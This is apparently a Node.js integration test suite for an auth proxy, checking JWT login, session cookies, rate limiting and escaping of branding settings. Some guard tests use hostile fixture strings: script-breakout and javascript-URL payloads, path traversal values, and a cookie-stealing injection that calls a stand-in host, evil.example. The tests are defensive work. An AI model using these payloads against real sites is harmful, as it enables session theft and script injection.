#!/usr/bin/env node
/**
 * Integration tests for EverClaw Auth Proxy
 *
 * Tests the proxy server with a mock OpenClaw backend.
 * Covers: health check, unauthenticated access, JWT verification,
 * session cookies, WebSocket auth, rate limiting, logout, edge cases.
 *
 * Usage: node test-proxy.mjs
 */

import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { createHmac, generateKeyPairSync, randomBytes } from 'node:crypto';
import { SignJWT, exportJWK } from 'jose';
import { createPrivateKey } from 'node:crypto';

// ─── Test Configuration ──────────────────────────────────────────────────────

const PROXY_PORT = 19789;   // Test proxy port (not 18789 to avoid conflicts)
const BACKEND_PORT = 19790;  // Mock OpenClaw port
const OWNER_PRIVY_ID = 'did:privy:test-owner-123';
const NON_OWNER_ID = 'did:privy:some-other-user';

let passed = 0;
let failed = 0;
let total = 0;

function assert(condition, message) {
  total++;
  if (condition) {
    passed++;
    console.log(`  ✅ ${message}`);
  } else {
    failed++;
    console.error(`  ❌ ${message}`);
  }
}

// Mirror of server.mjs escapeHtml (for asserting text-path fallback rendering)
function escapeHtmlRef(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// ─── Generate ES256 Test Keys ────────────────────────────────────────────────

const { publicKey, privateKey } = generateKeyPairSync('ec', {
  namedCurve: 'P-256',
});

const publicKeyPem = publicKey.export({ type: 'spki', format: 'pem' });
const privateKeyJwk = await exportJWK(createPrivateKey(privateKey.export({ type: 'pkcs8', format: 'pem' })));

// Ensure the JWK has the algorithm set
privateKeyJwk.alg = 'ES256';

const PRIVY_APP_ID = 'test-app-id';

async function signTestJwt(sub, options = {}) {
  const jwt = new SignJWT({})
    .setProtectedHeader({ alg: 'ES256' })
    .setIssuer(options.issuer || 'privy.io')
    .setAudience(options.audience || PRIVY_APP_ID)
    .setSubject(sub)
    .setIssuedAt()
    .setExpirationTime(options.exp || '1h');

  return jwt.sign(createPrivateKey(privateKey.export({ type: 'pkcs8', format: 'pem' })));
}

// ─── Mock OpenClaw Backend ───────────────────────────────────────────────────

let lastBackendHeaders = {};

function startMockBackend() {
  return new Promise((resolve) => {
    const server = createServer((req, res) => {
      lastBackendHeaders = { ...req.headers };
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        mock: 'openclaw',
        forwardedUser: req.headers['x-forwarded-user'] || null,
        path: req.url,
      }));
    });

    server.listen(BACKEND_PORT, '127.0.0.1', () => {
      console.log(`  Mock backend on :${BACKEND_PORT}`);
      resolve(server);
    });
  });
}

// ─── Start Auth Proxy (as child process) ─────────────────────────────────────

async function startProxy() {
  const { spawn } = await import('node:child_process');

  const env = {
    ...process.env,
    AUTH_PROXY_PORT: String(PROXY_PORT),
    OPENCLAW_INTERNAL_PORT: String(BACKEND_PORT),
    PRIVY_APP_ID: PRIVY_APP_ID,
    PRIVY_VERIFICATION_KEY: publicKeyPem,
    OPENCLAW_OWNER_PRIVY_ID: OWNER_PRIVY_ID,
    SESSION_SECRET: 'test-secret-for-testing-only-32chars!',
  };

  const child = spawn('node', ['server.mjs'], {
    cwd: new URL('.', import.meta.url).pathname,
    env,
    stdio: ['pipe', 'pipe', 'pipe'],
  });

  let stderr = '';
  child.stderr.on('data', (d) => { stderr += d.toString(); });
  child.stdout.on('data', (d) => { /* swallow */ });

  // Wait for proxy to be ready
  for (let i = 0; i < 30; i++) {
    try {
      const res = await fetch(`http://127.0.0.1:${PROXY_PORT}/health`);
      if (res.ok) {
        console.log(`  Auth proxy on :${PROXY_PORT}`);
        return child;
      }
    } catch { /* not ready yet */ }
    await new Promise(r => setTimeout(r, 200));
  }

  console.error('  ❌ Proxy failed to start');
  console.error('  stderr:', stderr);
  child.kill();
  process.exit(1);
}

// ─── HTTP Helpers ────────────────────────────────────────────────────────────

const BASE = `http://127.0.0.1:${PROXY_PORT}`;

async function get(path, headers = {}) {
  return fetch(`${BASE}${path}`, { headers, redirect: 'manual' });
}

async function post(path, body, headers = {}) {
  return fetch(`${BASE}${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: JSON.stringify(body),
    redirect: 'manual',
  });
}

function extractCookie(res) {
  const setCookie = res.headers.get('set-cookie') || '';
  const match = setCookie.match(/everclaw_session=([^;]+)/);
  return match ? match[1] : null;
}

// ─── Tests ───────────────────────────────────────────────────────────────────

async function runTests() {
  console.log('\n🧪 EverClaw Auth Proxy — Integration Tests\n');

  const backend = await startMockBackend();
  const proxyChild = await startProxy();

  try {
    // ── 1. Health check ──
    console.log('\n📋 Health Check');
    {
      const res = await get('/health');
      const data = await res.json();
      assert(res.status === 200, 'Health returns 200');
      assert(data.authProxy === true, 'Health response has authProxy: true');
    }

    // ── 2. Unauthenticated access → login page ──
    console.log('\n📋 Unauthenticated Access');
    {
      const res = await get('/');
      const html = await res.text();
      assert(res.status === 200, 'Root returns 200');
      assert(html.includes('OpenClaw'), 'Login page contains OpenClaw branding');
      assert(html.includes('Sign In'), 'Login page has sign-in text (title)');
      assert(html.includes('login-bundle.js'), 'Login page references bundle');
      assert(res.headers.get('x-frame-options') === 'DENY', 'X-Frame-Options: DENY');
      assert(res.headers.get('cache-control') === 'no-store', 'Cache-Control: no-store');
    }

    // ── 3. Login bundle JS served ──
    console.log('\n📋 Login Bundle');
    {
      const res = await get('/auth/login-bundle.js');
      const js = await res.text();
      assert(res.status === 200, 'Bundle returns 200');
      assert(res.headers.get('content-type').includes('javascript'), 'Content-Type is JavaScript');
      assert(js.length > 1000, `Bundle has content (${Math.round(js.length / 1024)}KB)`);
      assert(res.headers.get('cache-control').includes('immutable'), 'Bundle is cacheable');

      // Drift guard (2026-10-27, privy-login-parity): the login page must NOT
      // hardcode a loginMethods config — the Privy modal follows the app's
      // dashboard-enabled methods (server-driven). A hardcoded list drifted
      // from the dashboards before (dead Apple button, no X/GitHub/Discord at
      // the agent URL). SDK-internal property access (t.loginMethods) is fine;
      // an app-config array literal (loginMethods:["..."]) is the bug pattern.
      assert(!/loginMethods:\s*\[/.test(js), 'No hardcoded loginMethods array (dashboard-driven modal)');
      // And the SDK fallback branch (server-driven methods) must be present.
      assert(js.includes('loginMethods') && /else\s*\w+=\w*\.email_auth/.test(js.replace(/\n/g, ' ')),
        'SDK server-driven fallback branch present (email_auth from app config)');
      // Source-level guard (stable companion to the minified-bundle greps above,
      // which encode SDK minification details and may need updating on SDK
      // bumps): the PrivyProvider config in login-app.jsx must not hardcode a
      // loginMethods list either.
      const loginAppSource = await readFile(new URL('./login-app.jsx', import.meta.url), 'utf8');
      assert(!/loginMethods\s*:\s*\[/.test(loginAppSource),
        'login-app.jsx source has no hardcoded loginMethods (dashboard-driven)');
    }

    // ── 4. Auth callback — valid owner JWT → session cookie ──
    // Run happy path FIRST (before error cases consume rate limit window)
    console.log('\n📋 Successful Authentication');
    let sessionCookie;
    {
      const token = await signTestJwt(OWNER_PRIVY_ID);
      const res = await post('/auth/callback', { token });
      assert(res.status === 200, 'Valid owner JWT returns 200');
      const data = await res.json();
      assert(data.success === true, 'Response has success: true');

      sessionCookie = extractCookie(res);
      assert(sessionCookie !== null, 'Session cookie is set');
      assert(res.headers.get('set-cookie').includes('HttpOnly'), 'Cookie is HttpOnly');
      assert(res.headers.get('set-cookie').includes('SameSite=Lax'), 'Cookie is SameSite=Lax');
    }

    // ── 10. Authenticated request → proxied to backend ──
    console.log('\n📋 Authenticated Proxy');
    {
      const res = await get('/api/test', { Cookie: `everclaw_session=${sessionCookie}` });
      assert(res.status === 200, 'Authenticated request returns 200');
      const data = await res.json();
      assert(data.mock === 'openclaw', 'Response came from mock backend');
      assert(data.forwardedUser === OWNER_PRIVY_ID, `x-forwarded-user is ${OWNER_PRIVY_ID}`);
    }

    // ── 11. x-forwarded-user header stripping ──
    console.log('\n📋 Header Spoofing Prevention');
    {
      const res = await get('/api/test', {
        Cookie: `everclaw_session=${sessionCookie}`,
        'x-forwarded-user': 'evil-spoof@attacker.com',
      });
      const data = await res.json();
      assert(data.forwardedUser === OWNER_PRIVY_ID, 'Spoofed x-forwarded-user is stripped and replaced');
      assert(lastBackendHeaders['x-forwarded-user'] === OWNER_PRIVY_ID, 'Backend sees correct owner, not spoofed value');
    }

    // ── 12. Invalid session cookie → login page ──
    console.log('\n📋 Invalid/Expired Sessions');
    {
      const res = await get('/', { Cookie: 'everclaw_session=garbage-value' });
      const html = await res.text();
      assert(res.status === 200, 'Invalid cookie returns 200 (login page)');
      assert(html.includes('OpenClaw'), 'Shows login page for invalid cookie');
      const clearedCookie = res.headers.get('set-cookie');
      assert(clearedCookie && clearedCookie.includes('Max-Age=0'), 'Invalid cookie is cleared');
    }

    // ── 13. Tampered session cookie ──
    {
      // Take a valid cookie and tamper with it
      const decoded = Buffer.from(sessionCookie, 'base64url').toString('utf8');
      const tampered = Buffer.from(decoded.replace(OWNER_PRIVY_ID, 'did:privy:evil')).toString('base64url');
      const res = await get('/api/test', { Cookie: `everclaw_session=${tampered}` });
      const html = await res.text();
      assert(html.includes('OpenClaw'), 'Tampered cookie shows login page');
    }

    // ── Error cases (run after happy path to avoid rate limit conflict) ──
    console.log('\n📋 Auth Callback — Error Cases');
    {
      const res = await post('/auth/callback', {});
      assert(res.status === 400, 'Missing token returns 400');
      const data = await res.json();
      assert(data.error === 'missing_token', 'Error is missing_token');
    }
    {
      const res = await post('/auth/callback', { token: 'not-a-jwt' });
      assert(res.status === 401, 'Invalid JWT returns 401');
    }
    {
      const token = await signTestJwt(NON_OWNER_ID);
      const res = await post('/auth/callback', { token });
      assert(res.status === 403, 'Non-owner JWT returns 403');
      const data = await res.json();
      assert(data.reason === 'owner_mismatch', 'Reason is owner_mismatch');
    }
    {
      const token = await signTestJwt(OWNER_PRIVY_ID, { issuer: 'evil.io' });
      const res = await post('/auth/callback', { token });
      assert(res.status === 401, 'Wrong issuer returns 401');
    }
    {
      const token = await signTestJwt(OWNER_PRIVY_ID, { audience: 'wrong-app' });
      const res = await post('/auth/callback', { token });
      // This may be 401 or 429 (rate limited after 5 attempts)
      assert(res.status === 401 || res.status === 429, `Wrong audience returns 401 or 429 (got ${res.status})`);
    }

    // ── 14. Logout ──
    console.log('\n📋 Logout');
    {
      const res = await post('/auth/logout', {}, { Cookie: `everclaw_session=${sessionCookie}` });
      assert(res.status === 200, 'Logout returns 200');
      const data = await res.json();
      assert(data.success === true, 'Logout response has success: true');
      const clearedCookie = res.headers.get('set-cookie');
      assert(clearedCookie && clearedCookie.includes('Max-Age=0'), 'Session cookie is cleared');
    }

    // ── 15. Rate limiting ──
    console.log('\n📋 Rate Limiting');
    {
      // Burn through 5 attempts (rate limit is 5/min)
      // We already used some attempts above, so reset by waiting or just hammering
      const results = [];
      for (let i = 0; i < 7; i++) {
        const res = await post('/auth/callback', { token: 'bad-token-' + i });
        results.push(res.status);
      }
      const has429 = results.includes(429);
      assert(has429, `Rate limiter kicks in (statuses: ${results.join(',')})`);
    }

    // ── 16. Body too large ──
    console.log('\n📋 Body Size Limit');
    {
      const bigBody = { token: 'x'.repeat(20000) };
      const res = await post('/auth/callback', bigBody);
      assert(res.status === 413 || res.status === 429, `Large body rejected (status ${res.status})`);
    }

    // ── 17. Unauthenticated paths still serve login ──
    console.log('\n📋 Unauthenticated Path Coverage');
    {
      const paths = ['/some/random/path', '/api/v1/status', '/__openclaw__/control'];
      for (const path of paths) {
        const res = await get(path);
        const html = await res.text();
        assert(html.includes('OpenClaw'), `${path} → login page (no cookie)`);
      }
    }

    // ── 18. Brand icon image mode (BRAND_ICON="img:<path>") ──
    console.log('\n📋 Brand Icon Image Mode');
    {
      const { spawn } = await import('node:child_process');
      // Base port for branding tests — kept clear of PROXY_PORT (19789) and
      // BACKEND_PORT (19790) so per-case ports (IMG_PORT+1..+13) never collide
      // with the long-running main test proxy.
      const IMG_PORT = 19881;

      // Start a proxy with custom branding env on `port`. Throws after ~6s if it
      // fails to start (caller owns killing via try/finally — no orphan spawns).
      async function startBrandProxy(port, envOverrides) {
        const child = spawn('node', ['server.mjs'], {
          cwd: new URL('.', import.meta.url).pathname,
          env: {
            ...process.env,
            AUTH_PROXY_PORT: String(port),
            OPENCLAW_INTERNAL_PORT: String(BACKEND_PORT),
            PRIVY_APP_ID: PRIVY_APP_ID,
            PRIVY_VERIFICATION_KEY: publicKeyPem,
            OPENCLAW_OWNER_PRIVY_ID: OWNER_PRIVY_ID,
            SESSION_SECRET: 'test-secret-for-testing-only-32chars!',
            ...envOverrides,
          },
          stdio: ['pipe', 'pipe', 'pipe'],
        });
        for (let i = 0; i < 30; i++) {
          // Fail fast if the child died (e.g. port already in use) — otherwise
          // the poll could hit a DIFFERENT process already listening on that
          // port and mistake it for our proxy.
          if (child.exitCode !== null) break;
          try {
            const res = await fetch(`http://127.0.0.1:${port}/health`);
            if (res.ok) return child;
          } catch { /* not ready */ }
          await new Promise(r => setTimeout(r, 200));
        }
        child.kill('SIGTERM');
        throw new Error(`brand proxy on :${port} failed to start (exitCode=${child.exitCode})`);
      }

      // ── 18a. Happy path: img-mode renders the mascot ──
      let imgChild;
      try {
        imgChild = await startBrandProxy(IMG_PORT, {
          BRAND_NAME: 'InstallOpenClaw',
          BRAND_ICON: 'img:/auth/logo.png',
        });
        const res = await fetch(`http://127.0.0.1:${IMG_PORT}/`);
        const html = await res.text();
        assert(html.includes('<img src="/auth/logo.png"'), 'Login page renders img-mode brand icon');
        assert(html.includes('class="logo-img"'), 'Brand img has logo-img class');
        assert(html.includes('alt="InstallOpenClaw logo"'), 'Brand img alt text is the brand name');
        assert(!html.includes('🦞'), 'No emoji glyph in img mode');
        assert(html.includes('<title>InstallOpenClaw — Sign In</title>'), 'Page title follows brand name');

        const logoRes = await fetch(`http://127.0.0.1:${IMG_PORT}/auth/logo.png`);
        assert(logoRes.status === 200, '/auth/logo.png returns 200');
        assert((logoRes.headers.get('content-type') || '').includes('image/png'), 'Logo served as image/png');
        const cc = logoRes.headers.get('cache-control') || '';
        assert(!cc.includes('immutable') && cc.includes('max-age=86400'), 'Logo cache: 1-day, no immutable (rebrand freshness)');
        const logoBytes = new Uint8Array(await logoRes.arrayBuffer());
        assert(logoBytes.length === 64009, `Logo asset is the OpenClaw mascot (${logoBytes.length} bytes)`);
        assert(logoBytes[0] === 0x89 && logoBytes[1] === 0x50, 'Asset has PNG magic bytes');
      } finally {
        imgChild?.kill('SIGTERM');
      }

      // ── 18b. Guard: hostile/non-local src falls back to escaped text, never an img tag ──
      const hostileValues = [
        'img:javascript:alert(1)',
        'img:https://evil.example/x.png',
        'img:data:text/html;base64,x',
        'img://evil.example/x.png',
        'img:/\\evil.example/x.png',
        'img:',
        'img:/../secret',
        'img:/auth/logo.png.js',
      ];
      for (const [idx, hostile] of hostileValues.entries()) {
        const port = IMG_PORT + 1 + idx;
        let guardChild;
        try {
          guardChild = await startBrandProxy(port, {
            BRAND_NAME: 'InstallOpenClaw',
            BRAND_ICON: hostile,
          });
          const gres = await fetch(`http://127.0.0.1:${port}/`);
          const ghtml = await gres.text();
          assert(!ghtml.includes('<img'), `hostile src rejected, no img tag (${hostile})`);
          assert(ghtml.includes(escapeHtmlRef(hostile)), `hostile value falls back to escaped text (${hostile})`);
        } finally {
          guardChild?.kill('SIGTERM');
        }
      }

      // ── 18c. Positive variants: whitespace trim + case-insensitive detection + query strings ──
      for (const [idx, variant] of [' img:/auth/logo.png ', 'IMG:/auth/logo.png', 'img:/auth/logo.png?x'].entries()) {
        const port = IMG_PORT + 10 + idx;
        let vChild;
        try {
          vChild = await startBrandProxy(port, {
            BRAND_NAME: 'InstallOpenClaw',
            BRAND_ICON: variant,
          });
          const vres = await fetch(`http://127.0.0.1:${port}/`);
          const vhtml = await vres.text();
          const expectSrc = variant.trim().replace(/^img:/i, '');
          assert(vhtml.includes(`<img src="${expectSrc}"`), `variant renders img tag (${JSON.stringify(variant)})`);
        } finally {
          vChild?.kill('SIGTERM');
        }
      }

      // ── 18d. $-sequence safety in replacement values (function-form replace) ──
      let dChild;
      try {
        const dollarBrand = 'Pay$&Go$\u0027X$\u0060';
        dChild = await startBrandProxy(IMG_PORT + 20, {
          BRAND_NAME: dollarBrand,
          BRAND_ICON: 'img:/auth/logo.png',
        });
        const dres = await fetch(`http://127.0.0.1:${IMG_PORT + 20}/`);
        const dhtml = await dres.text();
        assert(dhtml.includes(escapeHtmlRef(dollarBrand)), 'dollar-bearing brand renders literally (no $&/$\'/"$`" expansion)');
        assert(dhtml.indexOf('<h1>') === dhtml.lastIndexOf('<h1>'), 'no $\' splice duplication of h1');
        assert(dhtml.indexOf('</html>') === dhtml.lastIndexOf('</html>'), 'no $\' splice duplication of document tail');
        assert(!dhtml.includes('__BRAND_NAME__'), 'no unexpanded placeholder');
        assert(dhtml.includes('<img src="/auth/logo.png"'), 'img mode intact with dollar brand');
      } finally {
        dChild?.kill('SIGTERM');
      }

      // ── 18e. Privy IDs are JS-literal encoded (script-context injection guard) ──
      for (const [idx, hostileAppId] of [
        `x';alert(1)//`,
        `</script><script>alert(1)</script>`,
        `x";fetch('//evil.example/'+document.cookie);//`,
      ].entries()) {
        const port = IMG_PORT + 30 + idx;
        let pChild;
        try {
          pChild = await startBrandProxy(port, {
            BRAND_NAME: 'InstallOpenClaw',
            BRAND_ICON: 'img:/auth/logo.png',
            PRIVY_APP_ID: hostileAppId,
          });
          const pres = await fetch(`http://127.0.0.1:${port}/`);
          const phtml = await pres.text();
          const scriptOpens = (phtml.match(/<script/g) || []).length;
          assert(scriptOpens === 2, `hostile PRIVY_APP_ID adds no script blocks (${idx})`);
          assert(!phtml.includes('</script><script>'), `no raw script-breakout sequence (${idx})`);
          const encoded = JSON.stringify(hostileAppId).replace(/</g, '\\u003c');
          assert(phtml.includes(`window.__EVERCLAW_PRIVY_APP_ID__ = ${encoded};`), `PRIVY_APP_ID rendered as inert JS literal (${idx})`);
        } finally {
          pChild?.kill('SIGTERM');
        }
      }
    }

  } finally {
    proxyChild.kill('SIGTERM');
    backend.close();
    await new Promise(r => setTimeout(r, 500));
  }

  // ── Summary ──
  console.log('\n' + '═'.repeat(50));
  console.log(`  Results: ${passed}/${total} passed, ${failed} failed`);
  console.log('═'.repeat(50) + '\n');

  process.exit(failed > 0 ? 1 : 0);
}

runTests().catch((err) => {
  console.error('❌ Test runner error:', err);
  process.exit(1);
});
